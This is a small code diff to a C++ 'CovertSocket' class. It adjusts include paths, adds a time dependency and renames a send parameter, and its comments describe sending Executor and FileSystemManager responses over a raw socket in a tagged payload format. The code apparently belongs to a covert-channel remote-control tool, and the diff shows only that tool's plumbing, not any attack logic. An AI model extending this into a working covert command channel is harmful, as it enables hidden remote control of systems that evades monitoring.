@@ -3,9 +3,9 @@
 //
 
 #include "CovertSocket.h"
-#include "../shared/Logger.h"
-#include "SystemState.h"
-#include "../shared/Structures.h"
+#include "../../shared/Logger.h"
+#include "../SystemState.h"
+#include "../../shared/Structures.h"
 
 #include <cerrno>
 #include <cstring>
@@ -13,9 +13,10 @@
 #include <netinet/udp.h>
 #include <malloc.h>
 
-CovertSocket::CovertSocket(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, string clientIP) {
+CovertSocket::CovertSocket(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, Time * time, string clientIP) {
     this->trafficAnalyzer = trafficAnalyzer;
     this->crypto = crypto;
+    this->time = time;
     this->clientIP = clientIP;
 
     this->rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -37,7 +38,11 @@ CovertSocket::CovertSocket(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, 
     }
 }
 
-void CovertSocket::send(string command) {
+//covert socket send, does not need to know any context of where the request came from, Executor and FileSystemManager
+//will generate the appropriate response for the request they receive. CovertSocket just plows them out
+void CovertSocket::send(string payload) {
+
+    //payload = {HAAN 00000000 data HAAN}\0
 
     PacketMeta meta;
     if(SystemState::currentState == SystemState::STARTUP){
